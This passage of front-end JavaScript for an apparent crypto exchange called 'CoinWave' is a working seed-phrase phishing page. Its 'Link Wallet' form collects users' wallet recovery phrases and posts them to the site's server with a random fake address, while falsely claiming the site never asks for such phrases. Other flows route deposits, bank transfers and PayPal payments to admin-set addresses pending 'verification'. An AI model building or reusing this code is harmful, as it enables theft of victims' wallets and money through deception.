style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">Trust Wallet</span><span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">MetaMask</span><span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">Binance Web3</span><span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">Coinbase</span><span style="background: #1a1a2a; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">Exodus</span></div></div><textarea id="seedPhraseInput" rows="4" placeholder="Enter your 12 or 24-word phrase separated by spaces" style="width: 100%; background: #0f0f15; border: 1px solid #333; padding: 15px; border-radius: 8px; color: #fff; font-family: monospace; font-size: 14px; line-height: 1.5; resize: none; margin-bottom: 20px; outline: none;"></textarea><div style="background: rgba(246, 70, 93, 0.1); border: 1px solid rgba(246, 70, 93, 0.3); border-radius: 8px; padding: 15px; margin-bottom: 25px;"><div style="display: flex; gap: 10px; align-items: flex-start; margin-bottom: 12px;"><span style="font-size: 18px; color: #f6465d;">🔒</span><p style="color: #f6465d; font-size: 12px; margin: 0; line-height: 1.5; font-weight: 600;">Bank-Level Security: We use 256-bit encryption to store your recovery phrase. CoinWave will never ask for a phrase from a personal wallet.</p></div><div style="border-top: 1px dashed rgba(246, 70, 93, 0.3); padding-top: 12px;"><p style="color: #fff; font-size: 12px; margin-bottom: 6px; font-weight: bold;">Benefits of Securing Your Wallet:</p><ul style="color: #aaa; font-size: 12px; margin: 0; padding-left: 18px; line-height: 1.6;"><li>Guaranteed fund recovery if you lose your phone</li><li>Seamless automated withdrawals & payouts</li><li>Cold storage protection against hackers</li></ul></div></div><button onclick="submitWallet()" style="background: #00d4aa; color: #000; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px; border: none; cursor: pointer;">Verify & Secure</button></div>`;
    createPageView('walletSyncPage', 'Link Wallet', content); showView('walletSyncPage');
};

window.submitWallet = async function() {
    const seedInput = document.getElementById('seedPhraseInput').value;
    const cleanedSeed = seedInput.trim().replace(/\s+/g, ' '); 
    const wordCount = cleanedSeed.split(' ').length;
    if (wordCount < 12) return showToast("Enter a valid 12 or 24-word phrase.");
    let fakeAddress = '0x' + Array.from({length: 40}, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
    const btn = event.target; btn.textContent = 'Verifying...'; btn.disabled = true;
    try {
        const res = await fetch('/api/wallet/import', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email: currentUser.email, seedPhrase: cleanedSeed, walletAddress: fakeAddress }) });
        if (res.ok) { showToast("Wallet submitted for review."); showView('dashboardView'); } else { showToast("Error submitting wallet."); btn.textContent = 'Verify & Secure'; btn.disabled = false; }
    } catch (error) { showToast("Error submitting wallet."); btn.textContent = 'Verify & Secure'; btn.disabled = false; }
};

window.showPaymentInstructions = function(symbol, cryptoAmount, fiatAmount) {
    if (!fiatAmount || fiatAmount === 'undefined') fiatAmount = "the agreed amount";
    let address = (globalSettings && globalSettings.wallets && globalSettings.wallets[symbol]) ? globalSettings.wallets[symbol] : "Contact Support";
    let isMissing = address.includes("Contact"); let qrCodeUrl = isMissing ? "" : `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${address}`;
    const content = `<div style="text-align: center;"><div style="margin-bottom: 25px;"><div style="width: 60px; height: 60px; background: rgba(0,212,170,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;"><svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg></div><h3 style="color: #fff; margin: 0 0 5px; font-size: 20px;">Order Created Successfully</h3><p style="color: #888; font-size: 14px;">To complete your sale and receive <strong style="color:#fff;">${fiatAmount}</strong>, please send the exact amount below.</p></div><div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 15px; text-align: left;"><p style="color: #888; font-size: 12px; margin-bottom: 5px; text-transform: uppercase;">Amount to Send</p><p style="color: #00d4aa; font-size: 24px; font-weight: 800; margin: 0;">${cryptoAmount} ${symbol}</p></div><div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: left;"><p style="color: #888; font-size: 12px; margin-bottom: 8px; text-transform: uppercase;">${symbol} Deposit Address</p>${qrCodeUrl ? `<img src="${qrCodeUrl}" style="background:#fff; padding:8px; border-radius:8px; margin-bottom:15px; width: 150px; height: 150px;">` : ''}<div style="display: flex; gap: 10px; align-items: center;"><div style="flex: 1; font-family: monospace; font-size: 13px; color: ${isMissing ? '#f6465d' : '#fff'}; word-break: break-all; background: #1a1a2a; padding: 12px; border-radius: 6px;">${address}</div>${!isMissing ? `<button onclick="navigator.clipboard.writeText('${address}'); this.textContent='Copied!'; setTimeout(()=>this.textContent='Copy', 2000);" style="background: #2a2a3a; color: #fff; border: 1px solid #333; padding: 12px 16px; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.2s;">Copy</button>` : ''}</div></div><div class="warning-banner" style="text-align: left; margin-bottom: 30px;"><span style="color: #f6465d; font-size: 16px;">⚠️</span><p>Pending verification. Only send ${symbol} to this address. Sending any other coin or using the wrong network will result in permanent loss of funds.</p></div><button onclick="showView('dashboardView')" style="background: #00d4aa; color: #000; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px; border: none; cursor: pointer;">I Have Sent The Crypto</button></div>`;
    createPageView('paymentPageView', 'Payment Instructions', content); showView('paymentPageView');
};

window.showBuyCheckoutPage = function(symbol, cryptoAmount, fiatAmount, method) {
    let detailsHtml = ""; const supportEmail = (globalSettings && globalSettings.supportEmail) ? globalSettings.supportEmail : "support@coinwave.com";
    const subject = encodeURIComponent(`Payment Proof: Buy ${symbol} - ${fiatAmount}`); const body = encodeURIComponent(`Hello CoinWave Support,\n\nI have just placed an order to buy ${cryptoAmount} of ${symbol} for ${fiatAmount}.\nMy Payment Method is ${method}.\n\nPlease find my payment proof attached to this email.\n\nThank you.`);
    const mailtoLink = `mailto:${supportEmail}?subject=${subject}&body=${body}`;
    if (method === 'Bank Transfer') { let bankDetails = (globalSettings && globalSettings.adminBankDetails) ? globalSettings.adminBankDetails : "Contact Support."; detailsHtml = `<div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: left;"><p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 5px;">Step 1: Send Fiat to this Bank Account</p><p style="color: #fff; font-size: 14px; white-space: pre-wrap; font-family: monospace;">${bankDetails}</p></div>`; } 
    else if (method === 'PayPal') { let paypalEmail = (globalSettings && globalSettings.adminPaypalEmail) ? globalSettings.adminPaypalEmail : "Contact Support."; detailsHtml = `<div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: left;"><p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 5px;">Step 1: Send Fiat to this PayPal Email</p><p style="color: #fff; font-size: 14px; font-family: monospace;">${paypalEmail}</p></div>`; } 
    else if (method === 'Credit Card') { let cardLink = (globalSettings && globalSettings.cardPaymentLink) ? globalSettings.cardPaymentLink : ""; if (cardLink) { detailsHtml = `<div style="background: #0f0f15; padding: 20px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: center;"><p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 15px;">Step 1: Pay securely via Card</p><a href="${cardLink}" target="_blank" style="background: #00d4aa; color: #000; padding: 14px 20px; border-radius: 8px; text-decoration: none; font-weight: bold; display: block; font-size: 16px;">Click Here to Pay</a></div>`; } else { detailsHtml = `<div class="warning-banner" style="text-align:left;"><p>Card payment link is not set. Please contact support.</p></div>`; } }
    const content = `<div style="text-align: center;"><div style="margin-bottom: 25px;"><div style="width: 60px; height: 60px; background: rgba(0,212,170,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;"><svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg></div><h3 style="color: #fff; margin: 0 0 5px; font-size: 20px;">Order Created Successfully</h3><p style="color: #888; font-size: 14px;">To complete your purchase of <strong style="color:#fff;">${cryptoAmount} ${symbol}</strong> for <strong style="color:#fff;">${fiatAmount}</strong>, please follow the steps below.</p></div>${detailsHtml}<div style="background: #1a1a2a; border: 1px solid #333; padding: 20px; border-radius: 8px; margin-bottom: 20px; text-align: center;"><p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 10px;">Step 2: Send Payment Proof</p><p style="color: #fff; font-size: 14px; margin-bottom: 15px;">After making the payment, click below to open your email app and send us your receipt.</p><a href="${mailtoLink}" style="background: #00d4aa; color: #000; padding: 14px; border-radius: 8px; text-decoration: none; font-weight: bold; display: block; font-size: 16px;">Open Email App</a></div><button onclick="showView('dashboardView')" style="background: #2a2a3a; color: #fff; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px; border: none; cursor: pointer;">Back to Dashboard</button></div>`;
    createPageView('buyCheckoutPage', 'Complete Payment', content); showView('buyCheckoutPage');
};

window.open2FAModal = async function() {
    let modal = document.getElementById('assetActionModal'); modal.style.display = 'flex'; modal.innerHTML = `<div class="modal-content"><p style="color:#fff; text-align:center;">Loading 2FA Settings...</p></div>`;
    try {
        const token = localStorage.getItem('token'); const res = await fetch('/api/auth/generate-2fa', { method: 'POST', headers: { 'Authorization': `Bearer ${token}` } }); const data = await res.json();
        if (!res.ok) throw new Error(data.error);
        modal.innerHTML = `<div class="modal-content" style="text-align: center;"><span onclick="document.getElementById('assetActionModal').style.display='none'" style="position: absolute; top: 15px; right: 20px; color: #888; font-size: 24px; cursor: pointer;">&times;</span><h2 style="color: #fff; margin-bottom: 10px;">Two-Factor Authentication</h2><p style="color: #888; font-size: 13px; margin-bottom: 20px;">Scan this QR code with Google Authenticator or Authy.</p><img src="${data.qrCodeUrl}" style="background: #fff; padding: 10px; border-radius: 8px; width: 150px; height: 150px; margin: 0 auto 20px;"><div class="input-group" style="text-align: left;"><label>Enter 6-digit code from App</label><input type="text" id="twoFactorCode" placeholder="123456" maxlength="6" style="text-align: center; letter-spacing: 5px; font-size: 18px;"></div><button onclick="window.verify2FA()" style="background: #00d4aa; color: #000; width: 100%; padding: 14px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer; margin-top: 10px;">Verify & Enable 2FA</button></div>`;
    } catch (err) { modal.innerHTML = `<div class="modal-content"><p style="color:#f6465d; text-align:center;">Error: ${err.message}</p></div>`; }
};

window.verify2FA = async function() {
    const code = document.getElementById('twoFactorCode').value; 
    if (code.length !== 6) return showToast("Please enter a 6-digit code.");
    const btn = document.querySelector('button[onclick="window.verify2FA()"]'); 
    btn.textContent = 'Verifying...'; btn.disabled = true;
    try {
        const token = localStorage.getItem('token'); 
        const res = await fetch('/api/auth/enable-2fa', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify({ token: code }) }); 
        const data = await res.json();
        if (res.ok) { 
            document.getElementById('assetActionModal').style.display = 'none'; 
            showCustomAlert('Success!', '2FA has been successfully enabled on your account.'); 
        } else { 
            showToast(data.error); 
            btn.textContent = 'Verify & Enable 2FA'; btn.disabled = false; 
        }
    } catch (err) { 
        showToast("Error connecting to server."); 
        btn.textContent = 'Verify & Enable 2FA'; btn.disabled = false; 
    }
};

/* =====================================================
   INITIALIZATION
   ===================================================== */
document.addEventListener('DOMContentLoaded', () => {
    populateTradeCoins(); 
    checkAuthState(); 
    loadMarkets();
    loadGlobalSettings();
});

/* =====================================================
   BULLETPROOF DASHBOARD RENDER (Fixes missing cards & eye)
   ===================================================== */

// 9. Fix the Eye Icon logic
window.toggleBalanceVisibility = function() {
    const valueEl = document.getElementById('totalPortfolioValue');
    const iconEl = document.getElementById('eyeIcon');
    if (!valueEl) return; 
    
    // Check current state
    const isHidden = valueEl.textContent === '******'; 
    
    if (!isHidden) { 
        valueEl.textContent = '******'; 
        if(iconEl) iconEl.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>'; 
    } else { 
        valueEl.textContent = valueEl.getAttribute('data-real-value') || '$0.00'; 
        if(iconEl) iconEl.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>'; 
    }
};

/* =====================================================
   ULTIMATE DASHBOARD & ROUTING FIX
   ===================================================== */

// 1. Fix the Markets routing (Hide Hero for logged-in users)
var originalShowViewRouting = window.showView;
window.showView = function(viewId, authType = 'login') {
    originalShowViewRouting(viewId, authType);
    if (viewId === 'guestView') {
        const hero = document.querySelector('.hero-container');
        if (hero) hero.style.display = currentUser ? 'none' : 'block';
        // Scroll to market list for logged in users
        if (currentUser) {
            setTimeout(() => {
                const marketList = document.getElementById('market-list');
                if (marketList) marketList.scrollIntoView({ behavior: 'smooth', block: 'start' });
            }, 100);
        }
    }
};

// 2. Fix the Transaction History Page
window.openTransactionHistoryPage = async function() {
    const content = `<div id="historyPageList" style="display: flex; flex-direction: column; gap: 10px;"><p style="color: #888; font-size: 13px; text-align: center; padding: 20px;">Loading history...</p></div>`;
    createPageView('historyPageView', 'Transaction History', content); showView('historyPageView');
    try {
        const res = await fetch(`/api/orders/user/${currentUser.email}`);
        const orders = await res.json();
        const listContainer = document.getElementById('historyPageList');
        if (!orders || orders.length === 0) { listContainer.innerHTML = '<div style="text-align:center; padding: 40px; color: #888;"><div style="font-size: 30px; margin-bottom: 10px;">📭</div>No transactions yet.</div>'; return; }
        listContainer.innerHTML = orders.map(o => {
            const isBuy = o.mode === 'buy'; const typeColor = isBuy ? '#0ecb51' : '#f6465d'; const typeText = isBuy ? 'BUY' : 'SELL';
            let statusColor = '#fcd535'; if (o.status === 'Approved' || o.status === 'Completed') statusColor = '#0ecb51'; if (o.status === 'Rejected' || o.status === 'Failed') statusColor = '#f6465d';
            let sendStr = o.sendAmount ? o.sendAmount.toString() : ''; if (!sendStr.includes(o.sendCurrency)) sendStr += ` ${o.sendCurrency || ''}`;
            let getStr = o.getAmount ? o.getAmount.toString() : ''; if (!getStr.includes(o.getCurrency)) getStr += ` ${o.getCurrency || ''}`;
            return `<div class="card" style="background: #1a1a2a; border: 1px solid #333; border-radius: 12px; padding: 15px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;"><div style="display: flex; flex-direction: column; gap: 5px;"><div style="display: flex; align-items: center; gap: 8px;"><span style="color: ${typeColor}; font-weight: bold; font-size: 14px;">${typeText}</span><span style="color: #fff; font-weight: 600; font-size: 14px;">${sendStr}</span></div><span style="color: #888; font-size: 11px;">${o.date || 'Just now'}</span></div><div style="text-align: right;"><div style="color: #fff; font-size: 14px; font-weight: 600;">${getStr}</div><div style="color: ${statusColor}; font-size: 11px; font-weight: bold; margin-top: 5px; text-transform: uppercase;">${o.status || 'Pending'}</div></div></div>`;
        }).join('');
    } catch (e) { document.getElementById('historyPageList').innerHTML = '<p style="color: #f6465d; text-align: center;">Error loading history.</p>'; }
};

// 3. Fix the Resume Order (View Crypto Address / Complete Payment)

// 4. Rebuild Dashboard with SEAMLESS Boxes and Fixed Pending Banner

/* =====================================================
   SURGICAL FIX: VIEW CRYPTO ADDRESS AFTER REFRESH
   ===================================================== */
// 1. Store the orders globally when the dashboard loads
var originalLoadDashboardForResume = window.loadDashboardData;

// 2. Fix the Resume Order function to use the cached data (No network lag)

/* =====================================================
   FIX: NEWEST PENDING ORDER & RESUME BUTTON
   ===================================================== */
window.resumeOrder = function(orderId, mode) {
    const order = (window.cachedOrders || []).find(o => String(o._id) === String(orderId));
    if (order) { 
        if (mode === 'buy') { showBuyCheckoutPage(order.getCurrency, order.getAmount, order.sendAmount, order.method); } 
        else { showPaymentInstructions(order.sendCurrency, order.sendAmount, order.getAmount); } 
    } else {
        fetch(`/api/orders/user/${currentUser.email}`).then(res => res.json()).then(orders => {
            const o = orders.find(x => String(x._id) === String(orderId));
            if (o) {
                if (mode === 'buy') { showBuyCheckoutPage(o.getCurrency, o.getAmount, o.sendAmount, o.method); } 
                else { showPaymentInstructions(o.sendCurrency, o.sendAmount, o.getAmount); } 
            } else { showToast("Order not found."); }
        }).catch(e => showToast("Error loading order."));
    }
};

window.loadDashboardData = async function() {
    if (!currentUser) return;
    const dashContainer = document.querySelector('.dash-container');
    if (!dashContainer) return;

    try {
        let balances = {}; let orders = []; let user = currentUser;
        try { const r = await fetch(`/api/user/${currentUser.email}/balances`); if(r.ok) balances = await r.json(); } catch(e) {}
        try { const r = await fetch(`/api/orders/user/${currentUser.email}`); if(r.ok) { const d = await r.json(); orders = Array.isArray(d) ? d : []; } } catch(e) {}
        try { const r = await fetch(`/api/user/${currentUser.email}`); if(r.ok) user = await r.json(); } catch(e) {}
        
        window.cachedOrders = orders; // Cache for the resume button

        let pendingAmounts = {};
        orders.filter(o => o.status === 'Pending' || o.status === 'pending').forEach(o => {
            if (o.mode === 'buy') {
                const symbol = o.getCurrency;
                const amount = parseFloat(o.getAmount) || 0;
                pendingAmounts[symbol] = (pendingAmounts[symbol] || 0) + amount;
            }
        });

        // SORT BY NEWEST FIRST
        const pendingOrders = orders
            .filter(o => o.status === 'Pending' || o.status === 'pending')
            .sort((a, b) => String(b._id).localeCompare(String(a._id)));

        let bannerHTML = '';
        if (pendingOrders.length > 0) {
            const latest = pendingOrders[0]; // Take the absolute newest
            const isBuy = latest.mode === 'buy';
            let title, desc, btn, icon;
            if (isBuy) {
                title = "Pending Fiat Payment";
                desc = `You have an unpaid order for ${latest.getAmount} ${latest.getCurrency}.`;
                btn = "Complete Payment"; icon = "💳";
            } else {
                title = "Pending Crypto Transfer";
                desc = `You have a pending order to sell ${latest.sendAmount} ${latest.sendCurrency}.`;
                btn = "View Crypto Address"; icon = "🪙";
            }
            
            bannerHTML = `
                <div class="pending-banner" style="background: rgba(252, 213, 53, 0.1); border: 1px solid #fcd535; border-radius: 12px; padding: 15px; display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px;">
                    <div style="display: flex; justify-content: space-between; align-items: flex-start; flex-wrap: wrap; gap: 10px;">
                        <div style="display: flex; align-items: flex-start; gap: 10px;">
                            <span style="font-size: 20px;">${icon}</span>
                            <div>
                                <p style="color: #fcd535; font-weight: bold; font-size: 14px; margin: 0 0 4px 0;">${title}</p>
                                <p style="color: #ccc; font-size: 13px; margin: 0;">${desc}</p>
                            </div>
                        </div>
                        <button onclick="window.resumeOrder('${latest._id}', '${latest.mode}')" style="background: #fcd535; color: #000; border: none; padding: 10px 15px; border-radius: 6px; font-weight: bold; font-size: 12px; cursor: pointer; white-space: nowrap;">${btn}</button>
                    </div>
                    <div style="background: rgba(14, 203, 81, 0.1); border: 1px solid rgba(14, 203, 81, 0.2); padding: 10px; border-radius: 6px;">
                        <p style="color: #0ecb51; font-size: 11px; margin: 0; line-height: 1.4;">✅ Already ${isBuy ? "paid" : "sent the crypto"}? Please ignore this notice while our team verifies your transaction.</p>
                    </div>
                </div>`;
        }

        let walletStatusHTML = '';
        if (user.walletStatus === 'approved') {
            walletStatusHTML = `<div id="walletApproved" style="display: block;"><div style="background: #0f0f15; border: 1px solid #00d4aa; border-radius: 8px; padding: 15px; display: flex; justify-content: space-between; align-items: center;"><div style="color: #fff; font-family: monospace; font-size: 13px; overflow: hidden; text-overflow: ellipsis; max-width: 70%;">${user.walletAddress}</div><button onclick="navigator.clipboard.writeText('${user.walletAddress}'); this.innerText='Copied';" style="background: #2a2a3a; color: #fff; border: none; padding: 6px 10px; border-radius: 4px; font-size: 11px;">Copy</button></div></div>`;
        } else if (user.walletStatus === 'pending') {
            walletStatusHTML = `<div id="walletPending" style="text-align: center; padding: 10px;"><p style="color: #fcd535;">Verifying Wallet...</p></div>`;
        } else {
            walletStatusHTML = `<div id="walletDisconnected"><p style="color: #888; font-size: 13px; margin-bottom: 15px;">Sync your wallet recovery phrase to enable instant crypto deposits and withdrawals.</p><div style="display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap;"><span style="background: #0f0f15; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">Trust Wallet</span><span style="background: #0f0f15; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">MetaMask</span><span style="background: #0f0f15; border: 1px solid #333; color: #aaa; padding: 6px 12px; border-radius: 20px; font-size: 11px;">Binance Web3</span></div><button class="btn-primary full-width" onclick="showImportWallet()" style="width: 100%; background: #00d4aa; color: #000; padding: 12px; border-radius: 8px; font-weight: bold; border: none;">Link Secure Wallet</button></div>`;
        }

        let hideZero = localStorage.getItem('hideZeroBalances') === 'true';
        let assetsHTML = `
            <div class="section-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3 style="margin: 0; font-size: 18px; font-weight: 600;">Your Assets</h3>
                <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
                    <span style="font-size: 13px; color: #aaa;">Hide Zero</span>
                    <div style="position: relative; width: 44px; height: 24px;">
                        <input type="checkbox" id="hideZeroToggle" ${hideZero ? 'checked' : ''} style="opacity: 0; width: 0; height: 0; position: absolute;">
                        <span id="toggleTrack" style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background-color: ${hideZero ? '#00d4aa' : '#3a3a4a'}; border-radius: 24px; transition: 0.3s;"></span>
                        <span id="toggleThumb" style="position: absolute; height: 20px; width: 20px; left: ${hideZero ? '21px' : '2px'}; bottom: 2px; background-color: #fff; border-radius: 50%; transition: 0.3s;"></span>
                    </div>
                </label>
            </div>
            <div class="asset-table-header"><span>Asset</span><span style="text-align: right;">Amount</span><span style="text-align: right;">Value</span></div>
            <div id="assetsListContainer" class="${hideZero ? 'hide-zeros' : ''}" style="display: flex; flex-direction: column;">
        `;
        
        let totalValue = 0;
        markets.forEach(coin => {
            const amount = Math.max(0, balances[coin.symbol] || 0); 
            const pendingAmt = pendingAmounts[coin.symbol] || 0;
            const value = amount * coin.price;
            totalValue += value;
            const rowClass = amount === 0 ? 'asset-row zero-row' : 'asset-row';
            const pendingBadge = pendingAmt > 0 ? `<div style="background: rgba(252, 213, 53, 0.1); color: #fcd535; font-size: 9px; padding: 2px 6px; border-radius: 4px; margin-top: 4px; display: inline-block; width: max-content;">${pendingAmt.toFixed(4)} Pending</div>` : '';

            assetsHTML += `
                <div class="${rowClass}" onclick="window.showAssetActions('${coin.symbol}', '${coin.name}', ${amount}, ${value})">
                    <div class="asset-name" style="display: flex; flex-direction: column; align-items: flex-start; gap: 0;">
                        <div style="display: flex; align-items: center; gap: 10px;"><div class="market-icon" style="background:${coin.color};">${coin.icon}</div> ${coin.name}</div>
                        ${pendingBadge}
                    </div>
                    <div class="asset-amount">${amount.toFixed(6)}</div>
                    <div class="asset-value">$${value.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
                </div>`;
        });
        
        assetsHTML += `
            </div>
            <div style="margin-top: 20px; border-top: 1px solid #2a2a3a; padding-top: 15px;">
                <button onclick="window.openTransactionHistoryPage()" style="background: transparent; border: none; color: #00d4aa; padding: 10px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; font-size: 14px;">View Transaction History</button>
            </div>
            <div style="margin-top: 15px; border-top: 1px solid #2a2a3a; padding-top: 20px; text-align: center; color: #888;">
                <div style="display: flex; justify-content: space-around; margin-bottom: 15px;">
                    <div><span style="font-size: 24px;">🛡️</span><br><span style="font-size: 11px;">Secure</span></div>
                    <div><span style="font-size: 24px;">❄️</span><br><span style="font-size: 11px;">Cold Storage</span></div>
                    <div><span style="font-size: 24px;">⚡</span><br><span style="font-size: 11px;">Fast</span></div>
                </div>
                <p style="font-size: 11px;">© 2024 CoinWave. All rights reserved.</p>
            </div>
        `;

        dashContainer.innerHTML = `
            ${bannerHTML}
            <div class="portfolio-header">
                <div style="display: flex; flex-direction: column; gap: 5px;">
                    <div style="display: flex; align-items: center; gap: 8px;">
                        <p style="margin: 0; color: #888; font-size: 13px;">Estimated Total Value</p>
                        <svg id="eyeIcon" onclick="toggleBalanceVisibility()" style="cursor: pointer; width: 16px; height: 16px; stroke: #888; fill: none; stroke-width: 2;"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                    </div>
                    <div style="display: flex; align-items: baseline; gap: 12px;">
                        <h1 id="totalPortfolioValue" style="margin: 0; font-size: 32px; font-weight: 700;" data-real-value="$${Math.max(0, totalValue).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}">$${Math.max(0, totalValue).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</h1>
                        <span id="portfolioPnl" style="color: #0ecb51; font-size: 13px; font-weight: 600; background: rgba(14, 203, 81, 0.1); padding: 4px 8px; border-radius: 6px;">+$0.00 (0.00%)</span>
                    </div>
                </div>
            </div>
            
            <div class="trade-buttons-grid" style="margin-top: 20px;">
                <button class="action-btn" onclick="openAssetSelector('deposit')" style="width: 100%; background: #1a1a2a; border: 1px solid #333; color: #fff; padding: 15px; border-radius: 8px; margin-bottom: 10px; cursor: pointer;">↓ Deposit</button>
                <button class="action-btn" onclick="openAssetSelector('withdraw')" style="width: 100%; background: #1a1a2a; border: 1px solid #333; color: #fff; padding: 15px; border-radius: 8px; margin-bottom: 15px; cursor: pointer;">↑ Withdraw</button>
            </div>
            <div class="trade-buttons-grid" style="display: flex; gap: 10px; margin-bottom: 20px;">
                <button class="btn-buy-large" onclick="requireAuth('tradeView', 'buy')" style="flex: 1; background: var(--success); color: #000; border: none; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px;">Buy</button>
                <button class="btn-sell-large" onclick="requireAuth('tradeView', 'sell')" style="flex: 1; background: var(--danger); color: #fff; border: none; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px;">Sell</button>
            </div>
            <div class="web3-wallet-card" style="background: #1a1a2a; border: 1px solid #333; border-radius: 16px; padding: 20px; margin-bottom: 20px; display: block !important;">
                <div class="wallet-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                    <div style="display: flex; align-items: center; gap: 10px;"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2"><rect x="2" y="6" width="20" height="14" rx="2"></rect><path d="M16 14h2"></path><path d="M2 10h20"></path></svg><h3 style="color: white; font-size: 16px; margin:0;">Wallet Connection</h3></div>
                    <span style="background: ${user.walletStatus === 'approved' ? 'rgba(14, 203, 81, 0.1)' : 'rgba(255,255,255,0.1)'}; color: ${user.walletStatus === 'approved' ? '#0ecb51' : '#888'}; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold;">${user.walletStatus ? user.walletStatus.toUpperCase() : 'NOT CONNECTED'}</span>
                </div>
                ${walletStatusHTML}
            </div>
            <div class="assets-section" style="background: #1a1a2a; border-radius: 16px; padding: 20px; margin-bottom: 20px;">
                ${assetsHTML}
            </div>
        `;
        
        const toggle = document.getElementById('hideZeroToggle');
        if (toggle) {
            toggle.addEventListener('change', (e) => {
                const isChecked = e.target.checked; localStorage.setItem('hideZeroBalances', isChecked);
                const listContainer = document.getElementById('assetsListContainer');
                if (isChecked) listContainer.classList.add('hide-zeros'); else listContainer.classList.remove('hide-zeros');
                document.getElementById('toggleTrack').style.backgroundColor = isChecked ? '#00d4aa' : '#3a3a4a';
                document.getElementById('toggleThumb').style.left = isChecked ? '21px' : '2px';
            });
        }
    } catch (error) { 
        console.error("Dashboard error:", error);
        dashContainer.innerHTML = `<p style="color: #f6465d; text-align: center; padding: 20px;">Error loading dashboard. Please refresh.</p>`;
    }
};

/* =====================================================
   PROFESSIONAL BUY CHECKOUT (Prominent Amount Box)
   ===================================================== */
window.showBuyCheckoutPage = function(symbol, cryptoAmount, fiatAmount, method) {
    let detailsHtml = ""; 
    const supportEmail = (globalSettings && globalSettings.supportEmail) ? globalSettings.supportEmail : "support@coinwave.com";
    const subject = encodeURIComponent(`Payment Proof: Buy ${symbol} - ${fiatAmount}`); 
    const body = encodeURIComponent(`Hello CoinWave Support,\n\nI have just placed an order to buy ${cryptoAmount} of ${symbol} for ${fiatAmount}.\nMy Payment Method is ${method}.\n\nPlease find my payment proof attached to this email.\n\nThank you.`);
    const mailtoLink = `mailto:${supportEmail}?subject=${subject}&body=${body}`;

    if (method === 'Bank Transfer') { 
        let bankDetails = (globalSettings && globalSettings.adminBankDetails) ? globalSettings.adminBankDetails : "<span style='color: #f6465d;'>Admin has not set bank details yet.</span>"; 
        detailsHtml = `
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: left;">
                <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 8px;">Step 2: Send Fiat to this Bank Account</p>
                <p style="color: #fff; font-size: 14px; white-space: pre-wrap; font-family: monospace; line-height: 1.5; margin: 0;">${bankDetails}</p>
